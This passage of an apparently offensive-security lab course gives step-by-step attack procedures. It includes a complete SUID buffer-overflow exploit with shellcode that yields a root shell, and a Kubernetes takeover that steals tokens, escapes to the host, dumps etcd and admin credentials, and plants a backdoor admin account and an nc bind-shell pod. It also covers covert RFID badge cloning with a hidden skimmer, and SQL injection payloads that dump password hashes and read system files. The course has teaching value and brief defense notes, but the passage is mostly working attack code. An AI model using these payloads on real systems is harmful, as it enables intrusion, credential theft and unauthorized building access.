# 3. Create timeline (MACB times, log correlation)
# 4. Identify initial vector (phishing email, download)
# 5. Analyze malware (static + dynamic analysis)
# 6. Review user activity (browser, email, bash history)
# 7. Examine network traffic (C2 communications, exfiltration)
# 8. Analyze memory (running processes, network connections)
# 9. Find persistence mechanisms (cron, services, SSH keys)
# 10. Assess data exfiltration (what was stolen?)
# 11. Compile IOCs (hashes, IPs, domains)
# 12. Write comprehensive report

# Time taken: ~5 hours
# Difficulty: Intermediate (requires forensics knowledge)</div>

            <h3>Lab 6: Complete Buffer Overflow Exploitation (Binary Exploitation)</h3>

            <p><strong>Scenario:</strong> You've discovered a vulnerable Linux binary running as a SUID root program. It has a stack-based buffer overflow. Your mission: develop a working exploit that spawns a root shell. This lab teaches memory corruption, shellcode injection, and return address overwrit

ing—foundation skills for exploit development!</p>

            <div class="info-box">
                <h4>Prerequisites</h4>
                <p>• Basic understanding of C programming<br>
                • Familiarity with x86/x64 assembly (registers, stack, instructions)<br>
                • GDB debugging basics<br>
                • Linux command line proficiency<br>
                • Python scripting (for exploit development)</p>
            </div>

            <h4>Step 1: Environment Setup & Binary Analysis</h4>

            <div class="code"># Download vulnerable binary (or compile your own):
# Sample vulnerable program (vuln.c):
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Usage: %s <input>\\n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    printf("Execution complete\\n");
    return 0;
}

# Compile with protections DISABLED (for learning):
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie -m32

# Flags explained:
# -fno-stack-protector  = Disable stack canaries
# -z execstack          = Make stack executable (allow shellcode)
# -no-pie               = Disable ASLR for binary
# -m32                  = Compile as 32-bit (easier to exploit)

# Set SUID (simulate privileged service):
sudo chown root:root vuln
sudo chmod 4755 vuln

# Verify:
ls -la vuln
# Output: -rwsr-xr-x 1 root root 15632 Jan  9 12:00 vuln

# Check protections:
checksec vuln

# Output:
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# Arch:     i386-32-little</div>

            <h4>Step 2: Crash the Program (Proof of Vulnerability)</h4>

            <div class="code"># Test with normal input:
./vuln AAAA
# Output: Execution complete

# Test with long input (overflow):
./vuln $(python3 -c 'print("A"*100)')

# Output: Segmentation fault (core dumped)

# Success! We crashed the program.
# This means we overwrote something critical (likely the return address)

# Generate pattern to find offset (where exactly do we control EIP?):
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100

# Output (unique pattern):
# Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

# Run with pattern:
./vuln "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"

# Debug with GDB:
gdb ./vuln

(gdb) run "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"

# Program crashes
# Output:
# Program received signal SIGSEGV, Segmentation fault.
# 0x37634136 in ?? ()

# The value 0x37634136 is the instruction pointer (EIP)
# This is where the return address should be!

# Find offset:
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37634136

# Output:
# [*] Exact match at offset 76

# Perfect! After 76 bytes of junk, the next 4 bytes control EIP!</div>

            <h4>Step 3: Control Execution (Overwrite Return Address)</h4>

            <div class="code"># Test our offset:
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"BBBB")' > payload.bin

# Run with payload:
./vuln $(cat payload.bin)

# In GDB:
gdb ./vuln
(gdb) run $(python3 -c 'print("A"*76 + "BBBB")')

# Crash at:
# 0x42424242 in ?? ()

# 0x42 = 'B' in hexadecimal
# We control EIP! We can redirect execution anywhere!

# Next: Where do we jump to?
# Option 1: Jump directly to shellcode in our buffer
# Option 2: ret2libc (use existing functions)
# Option 3: ROP chain (modern technique)

# For this lab: Jump to shellcode in buffer</div>

            <h4>Step 4: Generate Shellcode</h4>

            <div class="code"># Generate shellcode with msfvenom:
msfvenom -p linux/x86/exec CMD=/bin/sh -b '\\x00\\x0a\\x0d' -f python

# Flags:
# -p linux/x86/exec    = Payload (execute command)
# CMD=/bin/sh          = Command to execute
# -b '\\x00\\x0a\\x0d'  = Bad characters to avoid (NULL, newline, carriage return)
# -f python            = Output format (Python byte string)

# Output:
buf =  b""
buf += b"\\xd9\\xc1\\xd9\\x74\\x24\\xf4\\x5e\\x33\\xc9\\xb1"
buf += b"\\x0b\\x31\\x76\\x15\\x03\\x76\\x15\\x83\\xee\\xfc"
buf += b"\\x76\\x53\\x4f\\x68\\x57\\xe0\\xc1\\xd3\\xc1\\xa8"
buf += b"\\x9c\\xe8\\xeb\\xf7\\xdf\\xaa\\x4f\\x48\\x70\\x3e"
buf += b"\\x40\\xfa\\x21\\x4f\\xae\\xe2\\xc9\\x3f\\xe1\\x58"
buf += b"\\x3c\\x63\\x28\\xe1\\xdc"

# Shellcode is 53 bytes long

# NOP sled (for reliability):
# Add NOPs before shellcode so we don't need exact address
# NOP = \\x90 (do nothing instruction)

# Final payload structure:
# [NOPs] + [Shellcode] + [Padding] + [Return Address]</div>

            <h4>Step 5: Find Return Address (Where is our buffer?)</h4>

            <div class="code"># We need to find where our buffer is in memory

# Use GDB:
gdb ./vuln

# Set breakpoint before overflow:
(gdb) disassemble vulnerable_function
# Find address of strcpy call, set breakpoint after it

(gdb) break *0x08048492  # Address after strcpy

# Run with large input:
(gdb) run $(python3 -c 'print("A"*100)')

# Breakpoint hit

# Examine stack:
(gdb) x/40wx $esp

# Output:
# 0xbffff5c0:	0x41414141	0x41414141	0x41414141	0x41414141
# 0xbffff5d0:	0x41414141	0x41414141	0x41414141	0x41414141
# ...

# Our buffer starts around 0xbffff5c0!

# Choose return address in the middle of NOPs:
# Let's use: 0xbffff5d0

# Note: ASLR disabled, so address is consistent</div>

            <h4>Step 6: Craft Final Exploit</h4>

            <div class="code"># exploit.py
import struct

# Shellcode (execve("/bin/sh"))
shellcode = (
    b"\\xd9\\xc1\\xd9\\x74\\x24\\xf4\\x5e\\x33\\xc9\\xb1"
    b"\\x0b\\x31\\x76\\x15\\x03\\x76\\x15\\x83\\xee\\xfc"
    b"\\x76\\x53\\x4f\\x68\\x57\\xe0\\xc1\\xd3\\xc1\\xa8"
    b"\\x9c\\xe8\\xeb\\xf7\\xdf\\xaa\\x4f\\x48\\x70\\x3e"
    b"\\x40\\xfa\\x21\\x4f\\xae\\xe2\\xc9\\x3f\\xe1\\x58"
    b"\\x3c\\x63\\x28\\xe1\\xdc"
)

# Return address (points to NOP sled)
ret_addr = 0xbffff5d0

# Payload construction:
nops = b"\\x90" * 20          # NOP sled
payload = nops + shellcode     # NOPs + shellcode

# Calculate padding needed:
offset = 76
padding_size = offset - len(payload)
padding = b"A" * padding_size

# Pack return address (little-endian):
ret_addr_packed = struct.pack("<I", ret_addr)

# Final payload:
exploit = payload + padding + ret_addr_packed

# Print payload (to pipe into program):
print(exploit.decode('latin-1'))

# Save to file:
with open("exploit.bin", "wb") as f:
    f.write(exploit)

print(f"[+] Exploit generated: {len(exploit)} bytes")
print(f"[+] Return address: 0x{ret_addr:08x}")
print(f"[+] Payload: NOPs={len(nops)}, Shellcode={len(shellcode)}, Padding={padding_size}")</div>

            <h4>Step 7: Execute Exploit (Get Root Shell!)</h4>

            <div class="code"># Generate exploit:
python3 exploit.py > payload

# Test exploit:
./vuln "$(cat payload)"

# If successful:
# $ id
# uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),1000(user)
# 
# $ whoami
# root

# Success! We have root shell!

# The SUID bit caused the program to run with root privileges
# Our buffer overflow hijacked execution flow
# Shellcode executed as root = root shell!

# Clean up:
exit  # Exit root shell
rm payload exploit.bin

# What happened step-by-step:
# 1. Program copies our input into 64-byte buffer
# 2. Our input is 76+ bytes (overflow!)
# 3. Overflow overwrites return address on stack
# 4. Return address points to our NOP sled
# 5. CPU slides down NOPs to shellcode
# 6. Shellcode executes: execve("/bin/sh", NULL, NULL)
# 7. New shell spawned with SUID privileges (root!)</div>

            <h4>Step 8: Modern Protections (Why This Works in 2026)</h4>

            <div class="code"># This exploit worked because we DISABLED protections
# Real-world binaries have:

# 1. Stack Canaries (SSP):
# • Random value placed before return address
# • Checked before function returns
# • If modified → program aborts
# Bypass: Leak canary value, include in payload

# 2. NX (Non-Executable Stack):
# • Stack marked as non-executable
# • Shellcode on stack won't run
# Bypass: ROP chains (ret2libc, ret2plt)

# 3. ASLR (Address Space Layout Randomization):
# • Randomizes memory addresses each run
# • Our hardcoded address (0xbffff5d0) won't work
# Bypass: Information leak to reveal addresses

# 4. PIE (Position Independent Executable):
# • Binary loaded at random address
# • Function addresses change each run
# Bypass: Information leak + ROP gadgets

# 5. RELRO (Relocation Read-Only):
# • GOT (Global Offset Table) is read-only
# • Can't overwrite function pointers
# Bypass: Find other writable targets

# Modern exploit development = bypassing all these protections
# Requires: Information leaks + ROP chains + heap exploitation

# Check real binary protections:
checksec /bin/ls

# Output:
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

# All protections enabled = much harder to exploit!</div>

            <div class="metaphor-box">
                <h4>💡 Lab 6 Key Takeaways</h4>
                <p><strong>Skills learned:</strong><br>
                • Binary analysis with checksec<br>
                • GDB debugging (finding offsets, examining memory)<br>
                • Pattern creation/offset calculation (Metasploit tools)<br>
                • Shellcode generation (msfvenom)<br>
                • Buffer overflow exploitation (stack smashing)<br>
                • SUID privilege escalation<br>
                • Understanding modern protections (DEP, ASLR, canaries)<br><br>
                <strong>Next steps:</strong><br>
                • Practice on: PicoCTF, pwnable.kr, pwnable.tw<br>
                • Learn ROP chains (bypass NX)<br>
                • Learn heap exploitation (different attack surface)<br>
                • Study ASLR bypass techniques (info leaks)<br>
                • Read: "The Shellcoder's Handbook," "Hacking: The Art of Exploitation"<br><br>
                Buffer overflows are THE classic exploit. Master this = understand memory corruption at the deepest level! 🐛💻</p>
            </div>

            <h3>Lab 7: Container Escape & Kubernetes Exploitation (Cloud-Native Security)</h3>

            <p><strong>Scenario:</strong> You've compromised a web application running inside a Docker container in a Kubernetes cluster. Your mission: escape the container, pivot to other pods, compromise the Kubernetes API server, and gain cluster admin access. This lab teaches container security, Kubernetes enumeration, and cloud-native attack paths—essential skills for modern pentesting!</p>

            <h4>Step 1: Initial Foothold (Web Shell in Container)</h4>

            <div class="code"># Assume you've gained RCE via web vulnerability (SQLi, file upload, etc.)
# You have a web shell in the container

# Check environment:
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

hostname
# webapp-deployment-5d7c6b9f8d-x4m2p

uname -a
# Linux webapp-deployment-5d7c6b9f8d-x4m2p 5.10.0-21-cloud-amd64 #1 SMP Debian GNU/Linux

# Confirm we're in a container:
cat /proc/1/cgroup | grep -i docker
# 12:cpuset:/docker/4a5b8c9d3e2f...

# Or check for Kubernetes:
cat /proc/1/cgroup | grep -i kubepods
# 12:cpuset:/kubepods/besteffort/pod123abc.../4a5b8c9d...

# We're in Kubernetes!</div>

            <h4>Step 2: Container Enumeration</h4>

            <div class="code"># Check for misconfigurations:

# 1. Mounted Docker socket (common misconfiguration!):
ls -la /var/run/docker.sock
# If exists → instant root via Docker API!

# 2. Privileged container:
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = ALL capabilities = privileged!

# 3. Mounted host filesystem:
ls -la /host
ls -la /mnt
# Look for host root filesystem mounts

# 4. Kubernetes service account:
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
# token    = JWT for Kubernetes API
# ca.crt   = CA certificate
# namespace = Current namespace

# Read service account token:
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# eyJhbGciOiJSUzI1NiIsImtpZCI6Ij...

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# 5. Check environment variables:
env | grep -i kube
# KUBERNETES_SERVICE_HOST=10.96.0.1
# KUBERNETES_SERVICE_PORT=443

# 6. Network enumeration:
ip addr
# Usually only sees container network (eth0: 10.244.x.x)

# Can we reach Kubernetes API?
curl -k https://10.96.0.1:443
# {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden..."}

# Kubernetes API is accessible!</div>

            <h4>Step 3: Kubernetes API Reconnaissance</h4>

            <div class="code"># Query API with service account token:

# Test authentication:
curl -k -H "Authorization: Bearer $TOKEN" \\
  https://10.96.0.1:443/api/v1/namespaces/default/pods

# Response:
# {"kind":"PodList","apiVersion":"v1","items":[...]}

# Success! Our service account can list pods

# Enumerate permissions:

# List pods:
curl -k -H "Authorization: Bearer $TOKEN" \\
  https://10.96.0.1:443/api/v1/namespaces/default/pods | jq '.items[].metadata.name'

# Output:
# "webapp-deployment-5d7c6b9f8d-x4m2p"  # Us!
# "redis-master-0"
# "postgres-0"

# List namespaces:
curl -k -H "Authorization: Bearer $TOKEN" \\
  https://10.96.0.1:443/api/v1/namespaces | jq '.items[].metadata.name'

# Output:
# "default"
# "kube-system"  # Critical namespace!
# "kube-public"

# Try to list kube-system pods:
curl -k -H "Authorization: Bearer $TOKEN" \\
  https://10.96.0.1:443/api/v1/namespaces/kube-system/pods

# If FORBIDDEN → no access to kube-system (yet)
# If SUCCESS → we can see system pods!

# List secrets:
curl -k -H "Authorization: Bearer $TOKEN" \\
  https://10.96.0.1:443/api/v1/namespaces/default/secrets

# Secrets contain credentials, certificates, tokens!

# Try to create pods (escalation path):
curl -k -H "Authorization: Bearer $TOKEN" \\
  -H "Content-Type: application/json" \\
  -X POST \\
  -d @test-pod.json \\
  https://10.96.0.1:443/api/v1/namespaces/default/pods

# If FORBIDDEN → can't create pods
# If SUCCESS → we can deploy our own pods!</div>

            <h4>Step 4: Container Escape via Privileged Pod</h4>

            <div class="code"># If we can create pods, deploy privileged pod:

# Create malicious pod spec (evil-pod.json):
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {
    "name": "evil-pod",
    "namespace": "default"
  },
  "spec": {
    "containers": [{
      "name": "evil",
      "image": "ubuntu:latest",
      "command": ["/bin/bash", "-c", "sleep 3600"],
      "securityContext": {
        "privileged": true
      },
      "volumeMounts": [{
        "name": "host-root",
        "mountPath": "/host"
      }]
    }],
    "volumes": [{
      "name": "host-root",
      "hostPath": {
        "path": "/",
        "type": "Directory"
      }
    }],
    "restartPolicy": "Never"
  }
}

# Deploy pod:
curl -k -H "Authorization: Bearer $TOKEN" \\
  -H "Content-Type: application/json" \\
  -X POST \\
  -d @evil-pod.json \\
  https://10.96.0.1:443/api/v1/namespaces/default/pods

# Wait for pod to start:
curl -k -H "Authorization: Bearer $TOKEN" \\
  https://10.96.0.1:443/api/v1/namespaces/default/pods/evil-pod | jq '.status.phase'

# Output: "Running"

# Get shell in evil pod:
# (Requires exec endpoint access)
curl -k -H "Authorization: Bearer $TOKEN" \\
  https://10.96.0.1:443/api/v1/namespaces/default/pods/evil-pod/exec?command=/bin/bash&stdin=true&stdout=true&stderr=true&tty=true

# Now in privileged pod with host filesystem at /host!

# Escape to host:
chroot /host /bin/bash

# Check:
hostname
# master-node-01  # We're on the Kubernetes node!

id
# uid=0(root) gid=0(root) groups=0(root)

# Full root on Kubernetes node!</div>

            <h4>Step 5: Stealing Kubernetes Secrets</h4>

            <div class="code"># From compromised node, access kubelet certs:
ls -la /etc/kubernetes/
# admin.conf  = Cluster admin credentials!
# kubelet.conf
# controller-manager.conf
# scheduler.conf

# Copy admin.conf:
cat /etc/kubernetes/admin.conf

# Output (YAML):
# apiVersion: v1
# clusters:
# - cluster:
#     certificate-authority-data: LS0tLS1CRUdJTi...
#     server: https://10.0.0.1:6443
#   name: kubernetes
# contexts:
# - context:
#     cluster: kubernetes
#     user: kubernetes-admin
#   name: kubernetes-admin@kubernetes
# current-context: kubernetes-admin@kubernetes
# kind: Config
# users:
# - name: kubernetes-admin
#   user:
#     client-certificate-data: LS0tLS1CRUdJTi...
#     client-key-data: LS0tLS1CRUdJTi...

# This kubeconfig provides CLUSTER ADMIN access!

# Use it:
export KUBECONFIG=/etc/kubernetes/admin.conf

# Or extract and use from attacker machine:
# 1. Copy admin.conf to attacker
# 2. kubectl --kubeconfig=admin.conf get pods --all-namespaces

# Alternative: Steal etcd data (Kubernetes database):
ls -la /var/lib/etcd/
# etcd contains ALL cluster secrets unencrypted!

# Read secrets from etcd:
ETCDCTL_API=3 etcdctl --cacert /etc/kubernetes/pki/etcd/ca.crt \\
  --cert /etc/kubernetes/pki/etcd/server.crt \\
  --key /etc/kubernetes/pki/etcd/server.key \\
  get / --prefix --keys-only

# Returns ALL Kubernetes resources (secrets, tokens, passwords!)</div>

            <h4>Step 6: Cluster Takeover</h4>

            <div class="code"># With cluster admin access:

# List all secrets:
kubectl get secrets --all-namespaces

# Dump specific secret:
kubectl get secret -n kube-system admin-token-xyz -o yaml

# Decode base64:
echo "BASE64_VALUE" | base64 -d

# Create backdoor admin user:
kubectl create serviceaccount backdoor -n kube-system
kubectl create clusterrolebinding backdoor-admin \\
  --clusterrole=cluster-admin \\
  --serviceaccount=kube-system:backdoor

# Get backdoor token:
kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep backdoor | awk '{print $1}')

# Deploy persistent webshell pod:
kubectl run webshell --image=alpine --restart=Never -- /bin/sh -c "while true; do nc -l -p 4444 -e /bin/sh; done"

# Access all nodes:
kubectl get nodes
kubectl exec -it <node-pod> -- /bin/bash

# Exfiltrate data from all pods:
for pod in $(kubectl get pods --all-namespaces -o name); do
  kubectl exec $pod -- cat /etc/shadow
done

# Complete cluster compromise!</div>

            <div class="metaphor-box">
                <h4>💡 Lab 7 Key Takeaways</h4>
                <p><strong>Skills learned:</strong><br>
                • Container fingerprinting (cgroups, filesystem analysis)<br>
                • Kubernetes service account token usage<br>
                • Kubernetes API enumeration (pods, secrets, namespaces)<br>
                • Privileged pod deployment (container escape)<br>
                • Host filesystem access (chroot escape)<br>
                • Kubernetes credential theft (admin.conf, etcd)<br>
                • Cluster takeover (create admin users, deploy backdoors)<br><br>
                <strong>Key Kubernetes attack paths:</strong><br>
                1. <strong>Overprivileged service account:</strong> Create pods → deploy privileged pod → escape<br>
                2. <strong>Mounted Docker socket:</strong> Instant root via Docker API<br>
                3. <strong>Host path mounts:</strong> Access node filesystem directly<br>
                4. <strong>Node compromise:</strong> Steal kubelet credentials → cluster admin<br>
                5. <strong>etcd access:</strong> All secrets in plaintext<br><br>
                <strong>Defense:</strong><br>
                • Enable RBAC (least privilege service accounts)<br>
                • Use Pod Security Policies (PSP) or Pod Security Admission<br>
                • Never mount Docker socket or host paths<br>
                • Enable audit logging<br>
                • Encrypt etcd at rest<br>
                • Network segmentation (isolate nodes)<br><br>
                Kubernetes security is critical in 2026—every company runs containers! 🐳☸️</p>
            </div>

            <h3>Lab 8: Complete RFID Cloning & Badge Duplication (Physical Security)</h3>

            <p><strong>Scenario:</strong> You've been hired to test a company's physical security. They use RFID badges for building access. Your mission: capture a badge signal from an employee, clone it, and gain unauthorized physical access. This lab teaches RFID fundamentals, Proxmark3 usage, badge cloning techniques, and physical security testing—essential for comprehensive red team engagements!</p>

            <h4>Step 1: RFID Basics & Reconnaissance</h4>

            <div class="code"># RFID (Radio-Frequency Identification) types:

# Low Frequency (LF): 125 kHz
# • HID Prox cards (most common office badges)
# • EM4100/EM4102 cards
# • Read range: ~10 cm
# • Simple, easy to clone
# • Used in: Office buildings, hotels, parking

# High Frequency (HF): 13.56 MHz
# • Mifare Classic (common transit cards, hotel keys)
# • Mifare DESFire (more secure)
# • iCLASS (government, high-security)
# • NFC phones operate at this frequency
# • Read range: ~10 cm
# • More complex, but still cloneable
# • Used in: Transit, government, modern offices

# Ultra High Frequency (UHF): 860-960 MHz
# • Long-range RFID (supply chain, inventory)
# • Read range: 10+ meters!
# • Less common for access control
# • Used in: Warehouses, toll roads

# Our target: HID Prox (125 kHz) - most common office badge</div>

            <h4>Step 2: Equipment Setup (Proxmark3)</h4>

            <div class="code"># Proxmark3 = RFID research tool ($300)
# Alternatives:
# • ACR122U (~$40, NFC only)
# • Flipper Zero (~$200, multi-tool)
# • Chameleon Mini (~$60, emulation only)

# We'll use Proxmark3 (most powerful)

# Install software:
sudo apt install proxmark3

# Or compile from source:
git clone https://github.com/RfidResearchGroup/proxmark3.git
cd proxmark3
make clean && make all
sudo make install

# Connect Proxmark3 via USB

# Start client:
proxmark3 /dev/ttyACM0

# Output:
# [=] Session log /root/.proxmark3/logs/log_20260109.txt
# [+] loaded from JSON file /root/.proxmark3/preferences.json
# [=] Using UART port /dev/ttyACM0
# [+] About to use the following device: USB /dev/ttyACM0
# [+] Communicating with PM3 over USB-CDC
# 
#   ██████╗ ███╗   ███╗ ████╗
#   ██╔══██╗████╗ ████║ ╚══██║
#   ██████╔╝██╔████╔██║   ██╔╝
#   ██╔═══╝ ██║╚██╔╝██║   ██║
#   ██║     ██║ ╚═╝ ██║ ██████║
#   ╚═╝     ╚═╝     ╚═╝ ╚═════╝
#
# proxmark3>

# Check connection:
proxmark3> hw status

# Verify LF and HF antennas working</div>

            <h4>Step 3: Capture Target Badge (Covert Cloning)</h4>

            <div class="code"># Scenario: Tailgating attack
# You're behind employee at door, they badge in
# Your Proxmark3 is in bag/pocket, close to their badge

# Start LF search:
proxmark3> lf search

# Output (when badge detected):
# [+] Valid HID Prox ID found!
# [+] HID Prox TAG ID: 2006ec0c86 (8011)
# [+] Format: 26-bit (H10301)
# [+] Facility Code: 123
# [+] Card Number: 8011

# Success! We captured:
# • Facility Code: 123
# • Card Number: 8011

# Alternative: Use auto-read mode (background capture):
proxmark3> lf hid read

# Leave running, captures when badge is nearby

# Save for later:
# Write down Facility Code and Card Number
# Or use built-in clone command immediately</div>

            <h4>Step 4: Clone to Writable Card</h4>

            <div class="code"># You need writable cards:
# • T5577 cards (LF writable, $1 each)
# • Order from AliExpress, Amazon, eBay

# Place blank T5577 card on Proxmark3

# Clone directly from captured data:
proxmark3> lf hid clone --raw 2006ec0c86

# Or use facility code + card number:
proxmark3> lf hid clone -r 26 -f 123 -n 8011

# Flags:
# -r = Format (26-bit H10301)
# -f = Facility code (123)
# -n = Card number (8011)

# Output:
# [=] Preparing to clone HID tag
# [=] Done
# [?] Try `lf hid reader` to verify

# Verify clone:
proxmark3> lf hid reader

# Output:
# [+] HID Prox TAG ID: 2006ec0c86 (8011)
# [+] Format: 26-bit (H10301)
# [+] Facility Code: 123
# [+] Card Number: 8011

# Perfect match! Clone successful!

# Test on access control system:
# Present cloned card to reader
# Door should open!</div>

            <h4>Step 5: Advanced Techniques (Mifare Classic)</h4>

            <div class="code"># Mifare Classic cards are more complex (HF 13.56 MHz)
# Used in: Transit cards, hotel keys, some offices

# Check card type:
proxmark3> hf search

# Output:
# [+] Valid Mifare Classic 1K tag found

# Mifare uses encryption (Crypto1)
# But: Known weaknesses allow cracking

# Attack 1: Known default keys
proxmark3> hf mf chk --1k -f mfc_default_keys.dic

# Tests common default keys (factory defaults)

# Output:
# [+] Found valid key [ffffffffffff] (sector 0, A)
# [+] Found valid key [a0a1a2a3a4a5] (sector 1, A)
# ... # If many default keys found → easy attack!

# Attack 2: Nested attack (if some keys known):
proxmark3> hf mf nested --1k --blk 0 -a -k FFFFFFFFFFFF

# Uses known key to find other keys

# Attack 3: Hardnested attack (no keys known):
proxmark3> hf mf hardnested --blk 0 --a --k FFFFFFFFFFFF

# Takes ~5-10 minutes, but very reliable

# Once all keys found, dump card:
proxmark3> hf mf dump

# Output: hf-mf-<UID>-dump.bin

# Clone to writable card:
# 1. Buy Chinese Magic Card (UID changeable)
# 2. proxmark3> hf mf cload -f hf-mf-<UID>-dump.bin

# Perfect clone with matching UID!</div>

            <h4>Step 6: Building an RFID Skimmer (Covert Capture Device)</h4>

            <div class="code"># For long-term access, build skimmer:
# • Arduino + PN532 NFC module (~$15)
# • Battery pack
# • SD card module (logging)
# • Hide near door reader

# Sample Arduino code (simplified):
/*
#include <PN532_I2C.h>
#include <PN532.h>
#include <SD.h>

PN532_I2C pn532i2c(Wire);
PN532 nfc(pn532i2c);

void setup() {
  Serial.begin(115200);
  nfc.begin();
  SD.begin(10);
}

void loop() {
  uint8_t uid[7];
  uint8_t uidLength;
  
  if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, &uid[0], &uidLength)) {
    // Card detected!
    File logFile = SD.open("badges.txt", FILE_WRITE);
    
    // Log UID:
    for (uint8_t i=0; i < uidLength; i++) {
      logFile.print(uid[i], HEX);
    }
    logFile.println();
    logFile.close();
    
    delay(2000); // Debounce
  }
}
*/

# Deploy near reader:
# • Behind potted plant
# • Under desk near reader
# • Inside fake electrical outlet

# Retrieve device after hours/days
# Analyze captured badges
# Clone most common badges
# Gain building access!</div>

            <h4>Step 7: Defense & Detection</h4>

            <div class="code"># How companies defend against RFID cloning:

# 1. Encrypted cards:
# • iCLASS SE, HID SEOS, DESFire EV2
# • Mutual authentication (reader verifies card, card verifies reader)
# • Harder to clone (but not impossible with replay attacks)

# 2. Multi-factor authentication:
# • Badge + PIN
# • Badge + biometric
# • Badge + mobile app

# 3. Challenge-response:
# • Card must compute response to challenge
# • Clones won't work (unless you clone secure element)

# 4. Faraday sleeves:
# • RFID-blocking wallets/badge holders
# • Prevents unauthorized reads

# 5. Short read range:
# • Lower power readers
# • Requires badge very close to reader
# • Harder for skimmers

# Detection:
# • Monitor for duplicate badge uses (same badge, different locations, short time)
# • Video surveillance (correlate badge swipes with faces)
# • Anomaly detection (badge used at unusual time/location)
# • Physical inspection for skimmers</div>

            <div class="metaphor-box">
                <h4>💡 Lab 8 Key Takeaways</h4>
                <p><strong>Skills learned:</strong><br>
                • RFID fundamentals (LF vs HF, frequency ranges)<br>
                • Proxmark3 operation (reading, cloning, emulation)<br>
                • HID Prox badge cloning (most common access control)<br>
                • Mifare Classic attacks (default keys, nested, hardnested)<br>
                • RFID skimmer construction (Arduino + PN532)<br>
                • Physical security testing methodology<br>
                • Defense strategies (encrypted cards, multi-factor auth)<br><br>
                <strong>RFID attack toolkit:</strong><br>
                • <strong>Proxmark3:</strong> Research tool ($300, most powerful)<br>
                • <strong>Flipper Zero:</strong> Portable multi-tool ($200, great for field work)<br>
                • <strong>ACR122U:</strong> Budget NFC reader ($40, HF only)<br>
                • <strong>HackRF One:</strong> SDR for 433MHz/915MHz ($300)<br>
                • <strong>T5577 cards:</strong> LF writable ($1/ea)<br>
                • <strong>Magic Mifare:</strong> UID changeable ($2/ea)<br><br>
                <strong>Legal warning:</strong><br>
                • Cloning badges WITHOUT authorization = ILLEGAL<br>
                • Only test badges you own or have explicit permission<br>
                • Always document scope of engagement<br>
                • Physical pentesting requires clear legal agreements<br><br>
                Physical security is often the weakest link. Companies spend millions on cybersecurity but use $1 RFID badges! 🔐💳</p>
            </div>

            <h3>Lab 9: Complete SQL Injection to System Takeover (Advanced SQLi)</h3>

            <p><strong>Scenario:</strong> You've discovered SQL injection in a web application. Your mission: exploit it to dump the database, escalate to file read/write, achieve RCE, and take over the underlying server. This lab teaches advanced SQLi techniques—union-based, blind, out-of-band, file operations, and post-exploitation!</p>

            <h4>Step 1: Initial SQLi Discovery & Enumeration</h4>

            <div class="code"># Target: http://vulnerable-site.com/product.php?id=1

# Test for SQLi:
http://vulnerable-site.com/product.php?id=1'

# Error message:
# "You have an error in your SQL syntax near ''' at line 1"

# Confirmed SQL injection!

# Determine number of columns (UNION-based):
http://vulnerable-site.com/product.php?id=1 ORDER BY 1-- -     # Works
http://vulnerable-site.com/product.php?id=1 ORDER BY 2-- -     # Works
http://vulnerable-site.com/product.php?id=1 ORDER BY 3-- -     # Works
http://vulnerable-site.com/product.php?id=1 ORDER BY 4-- -     # Error!

# 3 columns in SELECT statement

# Find injectable columns:
http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,2,3-- -

# Page shows numbers in output (let's say 2 and 3 are visible)

# Database enumeration:
http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,@@version,database()-- -

# Output:
# MySQL Version: 8.0.32-0ubuntu0.20.04.2
# Current Database: webapp_db

# List databases:
http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,schema_name,3 FROM information_schema.schemata-- -

# Output:
# information_schema
# mysql
# performance_schema
# webapp_db

# List tables in webapp_db:
http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='webapp_db'-- -

# Output:
# products
# users       # Interesting!
# orders
# admin_users # Very interesting!

# List columns in users table:
http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -

# Output:
# id
# username
# email
# password  # Jackpot!
# role

# Dump users table:
http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,CONCAT(username,':',password),email FROM users-- -

# Output:
# admin:$2y$10$abcdef1234567890...
# john:$2y$10$xyz9876543210...
# jane:$2y$10$qwerty...

# Bcrypt hashes - need to crack offline</div>

            <h4>Step 2: File Operations (Reading /etc/passwd)</h4>

            <div class="code"># Check if file read is possible:
http://vulnerable-site.com/product.php?id=-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -

